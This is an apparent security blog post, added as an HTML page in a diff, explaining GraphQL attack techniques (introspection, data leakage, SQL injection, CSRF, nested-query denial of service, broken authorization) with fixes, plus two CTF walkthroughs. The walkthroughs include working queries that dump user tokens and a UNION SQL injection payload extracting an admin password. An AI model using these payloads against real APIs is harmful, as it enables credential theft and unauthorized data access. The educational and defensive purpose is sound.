@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>GraphQL注入 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">GraphQL注入</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/">2022-11-22</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="什么是GraphQL注入"><a href="#什么是GraphQL注入" class="headerlink" title="什么是GraphQL注入"></a>什么是GraphQL注入</h1><p> GraphQL 是一个用于API的查询语言，使用基于类型系统来执行查询的服务（类型系统由你的数据定义）。GraphQL 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。  </p>
+<p>GraphQL中文文档·<br><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/graphql-zh/ec2f2575c49a7954.md">https://www.bookstack.cn/read/graphql-zh/ec2f2575c49a7954.md</a></p>
+<p>如果你了解REST API会更快地了解它。像REST API，往往我们的请求需要多个API，每个API是一个类型。比如：<a target="_blank" rel="noopener" href="http://www.test.com/users/%7Bid%7D">http://www.test.com/users/{id}</a> 这个API可以获取用户的信息；再比如：<a target="_blank" rel="noopener" href="http://www.test.com/users/list">http://www.test.com/users/list</a> 这个API可以获取所有用户的信息。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667712995992-b10557ca-bcfa-43db-9f95-0be55e75ef24.png" alt="beepress-image-148242-1606793579.png"><br>比如查id为1的一个人的生日，可以这么查：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713213304-3dacaa0d-be46-40fe-ab15-85b80e942f97.png" alt="image.png"><br>再想知道他的身高、发色可以这样：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713274716-35f75660-d364-4bcd-a3bd-3a02762bf2ca.png" alt="image.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713351193-121bd2cb-54fa-41d8-b40a-a030ab5408de.png" alt="image.png"><br>通过上面这个例子就可以看出graphql与REST API的区别，仅用一个API即可完成所有的查询操作。并且他的语法和结构都是以一个对象不同属性的粒度划分，简单好用。</p>
+<h1 id="基本属性"><a href="#基本属性" class="headerlink" title="基本属性"></a>基本属性</h1><p>GraphQL的执行逻辑大致如下：<br>查询-&gt;解析-&gt;验证-&gt;执行<br>根据官方文档，主要的操作类型有三种：query（查询）、mutation（变更）、subscription（订阅），最常用的就是query，所有的查询都需要操作类型，除了简写查询语法。<br>类型语言TypeLanguage，type来定义对象的类型和字段，理解成一个数据结构，可以无关实现graphQL的语言类型。类型语言包括Scalar（标量）和Object（对象）两种。并且支持接口抽象类型。<br>Schema用于描述数据逻辑，Schema就是对象的合计，其中定义的大部分为普通对象类型。一定包括query，可能包含mutation，作为一个GraphQL的查询入口。<br>Resolver用于实现解析逻辑，当一个字段被执行时，相应的 resolver 被调用以产生下一个值。</p>
+<h1 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h1><p>简单来说就是，GraphQL内置了接口文档，你可以通过内省的方法获得这些信息，如对象定义、接口参数等信息。<br>当使用者不知道某个GraphQL接口中的类型哪些是可用的，可以通过__schema字段来向GraphQL查询哪些类型是可用的。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713714820-cdfddfcf-655f-4c7d-9908-5664584bf387.png" alt="image.png"></p>
+<ul>
+<li><strong>Query, Character, Human, Episode, Droid</strong> - 这些是我们在类型系统中定义的类型。</li>
+<li><strong>String, Boolean</strong> - 这些是内建的标量，由类型系统提供。</li>
+<li><strong>__Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive</strong> - 这些有着两个下划线的类型是内省系统的一部分。</li>
+</ul>
+<p> 现在，来试试找到一个可以探索出有哪些可用查询的地方。当我们设计类型系统的时候，我们确定了一个所有查询开始的地方，来问问内省系统它是什么！<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667716706372-432567f7-169b-4329-8f68-e3896efbb8a3.png" alt="image.png"><br> 这和我们在类型系统那章里说的一样，Query 类型是我们开始的地方！注意这里的命名只是一个惯例，我们也可以把 Query 取成别的名字，只要我们把它定义为所有查询出发的地方，它也依然会在这里被返回。尽管如此，还是把它命名为 Query 吧，这是一个有用的惯例。<br> 有时候也需要检验一个特定的类型。来看看Film 类型：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667717143389-b7204fa0-d0b6-4ccd-aa47-2d4df3c522ec.png" alt="image.png"><br>kind 返回一个枚举类型 __TypeKind，其中一个值是 OBJECT。<br>我们可以使用如下语法查询 Film有哪些字段:</p>
+<pre><code class="plsql">&#123;
+__type(name:&quot;Film&quot;)&#123;
+  name
+  fields&#123;
+    name
+    type&#123;
+      name
+      kind
+      ofType&#123;
+        name
+        kind
+      &#125;
+    &#125;
+  &#125;
+&#125;
+&#125;
+</code></pre>
+<p><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667717378913-a48fa951-fa30-476e-8fe1-67dc352c8db4.png" alt="image.png"></p>
+<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><p>通过内省查询，我们可以得到很多后端接口的信息。有了这些信息通过排查便可能发现更多的安全问题，比如信息泄露。<br>查询存在的类型：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721031832-bc64e985-25a7-4973-a444-a091b0981067.png" alt="f4ff5867e655f8a9f5f6a16d2962fbcb.png"><br> 查询类型所有的字段：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721050225-ac282716-4931-4078-946e-d56c15879ebe.png" alt="0e0e9ce978095d30a0ee822632c377b3.png"><br>在查找字段里是否包含一些敏感字段：<br>Email、token、password、authcode、license、key、session、secretKey、uid、address等。<br>除此以外还可以搜索类型中是否有edit、delete、remove、add等功能，来达到数据编辑、删除、添加的功能。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721072426-2679efb7-eb2f-499e-8157-1abfef751e8a.png" alt="b3c7e4cea45cb7a277d4caf5c1ced24e.png"></p>
+<h1 id="进入sql注入"><a href="#进入sql注入" class="headerlink" title="进入sql注入"></a>进入sql注入</h1><p> graphql的sql注入与一般的sql注入类似，都是可以通过构造恶意语句达到注入获取数据或改变查询逻辑的目的<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667720031540-be394278-36d8-4175-a0fa-2e7ee356c79e.png" alt="48a153df3e0d941632643de526417093.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667720041854-443c7a0a-aa2b-4ac0-b1c8-d600b798ce18.png" alt="c9c5ced48d8363e287de237d970eae7e.png"><br> 只有直接使用graphql进行查询才会出现的问题，正确的使用参数化查询，不会遇到sql注入的问题。 </p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>burp插件<br><a target="_blank" rel="noopener" href="https://github.com/doyensec/inql">https://github.com/doyensec/inql</a><br>Express-GraphQL Endpoint CSRF漏洞<br>在Express-GraphQL中存在CSRF漏洞。如果将Content-Type修改为application/x-www-form-urlencoded ，再将POST请求包内容URL编码并生成csrf poc 即可实施csrf攻击，对敏感操作如mutation（变更）造成危害。<br>大概就是：默认graphql查询时，都是依赖于json数据格式进行传输给后端的，但是使用Express-GraphQL的时候，给json转换成form表单格式的数据也可以提交给后端正常处理，也就可以直接用burp生成的CSRF POC进行CSRF攻击了</p>
+<pre><code class="plsql">原数据包：
+POST /? HTTP/1.1
+Host: graphqlapp.herokuapp.com
+Origin: https://graphqlapp.herokuapp.com
+User-Agent: Graphiql/http
+Referer: https://graphqlapp.herokuapp.com/
+Cookie: [mask]
+Content-Type: application/json
+Content-Length: 108
+&#123;&quot;query&quot;:&quot;mutation &#123;\n editProfile(name:\&quot;hacker\&quot;, age: 5) &#123;\n name\n
+age\n &#125;\n&#125;&quot;,&quot;variables&quot;:null&#125;
+修改后也能使用的数据包：
+POST /? HTTP/1.1
+Host: graphqlapp.herokuapp.com
+Origin: https://graphqlapp.herokuapp.com
+User-Agent: Graphiql/http
+Referer: https://graphqlapp.herokuapp.com/
+Cookie: [mask]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 138
+query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
+5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
+</code></pre>
+<p>  修复方式可以考虑将CORS配置为仅允许来自受信任域的白名单的请求，或者确保正在使用CSRF令牌.实施多种保护将降低成功攻击的风险.  </p>
+<h1 id="嵌套查询拒绝服务"><a href="#嵌套查询拒绝服务" class="headerlink" title="嵌套查询拒绝服务"></a>嵌套查询拒绝服务</h1><p> 当业务的变量互相关联，如以下graphql定义为这样时，就可能无限展开，造成拒绝服务。  </p>
+<pre><code class="plsql">type Thread &#123;
+  messages(first: Int, after: String): [Message]
+&#125;
+</code></pre>
+<pre><code class="plsql">type Message &#123;
+  thread: Thread
+&#125;
+</code></pre>
+<pre><code class="plsql">type Query &#123;
+  thread(id: ID!): Thread
+&#125;
+</code></pre>
+<p>默认情况下，GraphQL 中的所有类型都是可为空的；空值是上述所有类型的有效响应。要声明不允许 null 的类型，可以使用 GraphQL Non?Null 类型。此类型包装基础类型，并且此类型的行为与该包装类型相同，但 null 不是包装类型的有效响应。尾随感叹号用于表示使用 Non?Null 类型的字段，如下所示：name: String!。<br>换句话说，GraphQL 中的类型默认可以为空。类型后的感叹号专门指定该类型为不可为空。<br>就有可能存在拒绝服务的风险。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721590946-361ce721-3ed2-49cf-8854-2d236bbb7b64.png" alt="image.png"><br> 修复方式可以考虑增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100  </p>
+<h1 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h1><p> graphql本身建议由业务层做权限控制，graphql作为一个单路由的API接口完成数据查询操作。开发者在使用时经常会忽略接口的鉴权问题。有时候客户端调用查询接口，直接传入了id等信息并未做好权限校验，就有可能存在水平越权  <img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721666095-3645112b-a1ad-442c-83f3-9dc03dc41c9b.png" alt="284177284d3f098468827b8ffd745162.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721670294-8c48d534-af32-43d5-a26e-e3641a2e4c8d.png" alt="f6e974c205db0a29f17de74ab4fe5ee9.png"><br> 修复方式建议在GraphQL和数据之间多加一个权限校验层，或者由业务自行实现权限校验。  </p>
+<h1 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h1><h2 id="corCTT2021-devme"><a href="#corCTT2021-devme" class="headerlink" title="corCTT2021 devme"></a>corCTT2021 devme</h2><p><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667723151532-f6d37fe9-d7b0-46e8-bed6-7f923b88c3d7.png" alt="devme-1.png"><br>随便输入一个email</p>
+<pre><code class="plsql">POST /graphql HTTP/1.1
+Content-Type: application/json
+
+&#123;
+    &quot;query&quot;: &quot;mutation createUser($email: String!) &#123;\n\tcreateUser(email: $email) &#123;\n\t\tusername\n\t&#125;\n&#125;\n&quot;,
+    &quot;variables&quot;: &#123;
+        &quot;email&quot;: &quot;test@test.com&quot;
+    &#125;
+&#125;
+</code></pre>
+<p>尝试内省查询</p>
+<pre><code class="plsql">&#123;
+    __schema &#123;
+        types &#123;
+            name
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>返回包</p>
+<pre><code class="plsql">&#123;
+    &quot;data&quot;: &#123;
+        &quot;__schema&quot;: &#123;
+            &quot;types&quot;: [
+                &#123;
+                    &quot;name&quot;: &quot;Query&quot;
+                &#125;,
+                ... lots of default types
+                &#123;
+                    &quot;name&quot;: &quot;User&quot;
+                &#125;
+            ]
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>我们来查询一下User类型</p>
+<pre><code class="plsql">&#123;
+    __type(name: &quot;User&quot;) &#123;
+        fields &#123;
+            name
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="plsql">&#123;
+    &quot;data&quot;: &#123;
+        &quot;__type&quot;: &#123;
+            &quot;fields&quot;: [
+                &#123;
+                    &quot;name&quot;: &quot;token&quot;
+                &#125;,
+                &#123;
+                    &quot;name&quot;: &quot;username&quot;
+                &#125;
+            ]
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>我们先来看下哪些查询是被支持的</p>
+<pre><code class="plsql">&#123;
+    __type(name: &quot;Query&quot;) &#123;
+        fields &#123;
+            name
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="plsql">&#123;
+    &quot;data&quot;: &#123;
+        &quot;__type&quot;: &#123;
+            &quot;fields&quot;: [
+                &#123;
+                    &quot;name&quot;: &quot;users&quot;
+                &#125;,
+                &#123;
+                    &quot;name&quot;: &quot;flag&quot;
+                &#125;
+            ]
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>我们在里面发现了flag,试着查询一下</p>
+<pre><code class="plsql">&#123;
+    flag
+&#125;
+</code></pre>
+<pre><code class="plsql">&#123;
+    &quot;errors&quot;: [
+        &#123;
+            &quot;message&quot;: &quot;Field \&quot;flag\&quot; argument \&quot;token\&quot; of type \&quot;String!\&quot; is required, but it was not provided.&quot;,
+            &quot;locations&quot;: [
+                &#123;
+                    &quot;line&quot;: 1,
+                    &quot;column&quot;: 2
+                &#125;
+            ]
+        &#125;
+    ]
+&#125;
+</code></pre>
+<p>结果就是我们不能查询，我们需要提供token的值，那让我们查询下User里的token</p>
+<pre><code class="plsql">&#123;
+    users &#123;
+        username
+        token
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="plsql">&#123;
+    &quot;data&quot;: &#123;
+        &quot;users&quot;: [
+            &#123;
+                &quot;username&quot;: &quot;admin&quot;,
+                &quot;token&quot;: &quot;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&quot;
+            &#125;,&#123;
+                &quot;username&quot;: &quot;b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c&quot;,
+                &quot;token&quot;: &quot;5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6&quot;
+            &#125;
+            ... more users
+        ]
+    &#125;
+&#125;
+</code></pre>
+<p>我们使用admin的token去获得flag</p>
+<pre><code class="plsql">&#123;
+    flag(token: &quot;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&quot;)
+&#125;
+</code></pre>
+<pre><code class="plsql">&#123;
+    &quot;data&quot;: &#123;
+        &quot;flag&quot;: &quot;&quot;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="祥云杯2022-Funweb"><a href="#祥云杯2022-Funweb" class="headerlink" title="祥云杯2022 Funweb"></a>祥云杯2022 Funweb</h2><p>前面用到的jwt漏洞是这个CVE-2022-39227，这里就不提及，主要看graohQL注入<br>还是先内省查询</p>
+<pre><code class="plsql">&#123;
+    __schema &#123;
+        types &#123;
+            name
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>回显</p>
+<pre><code class="plsql">&#123;&#39;__schema&#39;:
+    &#123;&#39;types&#39;: [&#123;&#39;name&#39;: &#39;Query&#39;&#125;, 
+             &#123;&#39;name&#39;: &#39;Getscorebyname&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;String&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;Getscorebyid&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;Int&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;Boolean&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__Schema&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__Type&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__TypeKind&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__Field&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__InputValue&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__EnumValue&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__Directive&#39;&#125;,
+             &#123;&#39;name&#39;: &#39;__DirectiveLocation&#39;&#125;]
+&#125;
+&#125;
+</code></pre>
+<p>再查询Getscorebyid</p>
+<pre><code class="plsql">&#123; Getscorebyid(id: 1)
+    &#123; 
+        id 
+        name 
+        score 
+&#125;
+&#125;
+</code></pre>
+<p>  回显:</p>
+<pre><code class="plsql">&#123;
+    &#39;getscoreusingid&#39;: 
+            &#123;
+                    &#39;id&#39;: &#39;1&#39;, 
+                    &#39;name&#39;: &#39;admin&#39;, 
+                    &#39;score&#39;: &#39;100&#39;
+            &#125;
+&#125;
+# 这里用getscorebyid不行，故改为getscoreusingid
+</code></pre>
+<p>然后获取字段:</p>
+<pre><code class="plsql">&#123;
+  __type (name: &quot;Getscorebyid&quot;) &#123;
+    name
+    fields &#123;
+      name
+      type &#123;
+        name
+        kind
+        ofType &#123;
+          name
+          kind
+        &#125;
+      &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>最后拿管理员密码的paylaod</p>
+<pre><code class="plsql">&#123; 
+    getscoreusingnamehahaha(name:&quot;admin&#39;union select password from users where name=&#39;admin&#39; and &#39;1&#39;=&#39;1&quot;)
+    &#123;   
+                name 
+                score 
+    &#125;
+&#125;
+</code></pre>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/148242.html">https://www.secpulse.com/archives/148242.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34080903/article/details/89390255">https://blog.csdn.net/weixin_34080903/article/details/89390255</a></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/">https://sakurahack-y.github.io/2022/11/22/GraphQL注入/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/GraphQL%E6%B3%A8%E5%85%A5/">GraphQL注入</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFGraphQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">什么是GraphQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%B1%9E%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">基本属性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%9C%81%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.</span> <span class="toc-text">内省查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">进入sql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">6.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E6%9F%A5%E8%AF%A2%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.</span> <span class="toc-text">嵌套查询拒绝服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">8.</span> <span class="toc-text">权限问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-number">9.</span> <span class="toc-text">ctf题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#corCTT2021-devme"><span class="toc-number">9.1.</span> <span class="toc-text">corCTT2021 devme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF2022-Funweb"><span class="toc-number">9.2.</span> <span class="toc-text">祥云杯2022 Funweb</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/">OOB外带攻击 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
